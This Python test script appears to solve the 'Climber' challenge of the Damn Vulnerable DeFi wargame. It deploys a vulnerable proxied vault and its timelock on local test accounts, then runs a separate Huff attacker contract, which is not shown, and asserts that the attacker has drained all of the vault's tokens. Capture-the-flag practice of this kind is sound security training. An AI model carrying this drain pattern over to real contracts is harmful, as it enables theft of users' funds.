from ape import accounts, project
from eth_abi import encode
from ..utils.helper import (
    w3,
    reverts,
    get_sig,
    send_tx,
    set_balance,
    deploy_huff_contract,
    ZERO_ADDRESS,
)

VAULT_TOKEN_BALANCE = w3.to_wei(10000000, "ether")
ATTAKER_INITIAL_ETH_BALANCE = w3.to_wei(0.1, "ether")
TIMELOCK_DELAY = 60 * 60


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]
    proposer = accounts.test_accounts[2]
    sweeper = accounts.test_accounts[3]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n⇒ Proposer: {proposer}"
    )
    print(f"⇒ Sweeper: {sweeper}\n---\n")

    # Attacker starts off with 0.1 ETH balance
    print("\n--- Setting attacker's balance to 0.1 ETH ---\n")
    set_balance(attacker, ATTAKER_INITIAL_ETH_BALANCE)
    assert attacker.balance == ATTAKER_INITIAL_ETH_BALANCE

    # Deploy the vault behind a proxy using the UUPS pattern,
    # passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    print("\n--- Deploying Vault behind a proxy (using UUPS pattern) ---\n")
    temp_vault = project.ClimberVault.deploy(sender=deployer)
    encoder = project.Encoder.deploy(sender=deployer)
    data = encoder.get_encoded(
        deployer,
        proposer,
        sweeper,
    )
    proxy = project.ERC1967Proxy.deploy(temp_vault, data, sender=deployer)
    vault = project.ClimberVault.at(proxy)

    assert vault.getSweeper() == sweeper
    assert vault.getLastWithdrawalTimestamp() > 0
    assert vault.owner() != ZERO_ADDRESS
    assert vault.owner() != deployer

    # Instantiate timelock
    print("\n--- Instantiating Timelock ---\n")
    timelock_address = vault.owner()
    timelock = project.ClimberTimelock.at(timelock_address)

    # Ensure timelock delay is correct and cannot be changed
    assert timelock.delay() == TIMELOCK_DELAY
    with reverts():
        timelock.updateDelay(TIMELOCK_DELAY + 1, sender=deployer)

    # Ensure timelock roles are correctly initialized
    print("\n--- Ensuring timelock roles are correctly initialized ---\n")
    assert timelock.hasRole(encoder.get_role("PROPOSER_ROLE"), proposer)
    assert timelock.hasRole(encoder.get_role("ADMIN_ROLE"), deployer)
    assert timelock.hasRole(encoder.get_role("ADMIN_ROLE"), timelock)

    # Deploy token and transfer initial token balance to the vault
    print("\n--- Deploying token and transferring initial token balance to vault ---\n")
    token = project.DamnValuableToken.deploy(sender=deployer)
    token.transfer(vault, VAULT_TOKEN_BALANCE, sender=deployer)

    # define initial balances for attacker and vault
    vault_initial_bal = token.balanceOf(vault) / 10**18
    attacker_initial_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Vault: {vault_initial_bal}\n⇒ Attacker: {attacker_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = deploy_huff_contract(
        "ClimberAttacker.huff",
        encode(
            ["address", "address", "address"],
            [token.address, timelock.address, vault.address],
        ),
        attacker,
    )
    send_tx(attacker, attacker_contract, get_sig("attack()"))

    # --- AFTER EXPLOIT => attacker must have stolen all tokens from the Vault --- #
    print(
        "\n--- After exploit: Attacker has stolen all the tokens from the Vault ---\n"
    )

    # define ending balances for attacker and wallet
    vault_ending_bal = token.balanceOf(vault) / 10**18
    attacker_ending_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Vault: {vault_ending_bal}\n⇒ Attacker: {attacker_ending_bal}\n---\n"
    )

    # vault has no more tokens and attacker has all remaining tokens
    assert token.balanceOf(vault) == 0
    assert token.balanceOf(attacker) == VAULT_TOKEN_BALANCE

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
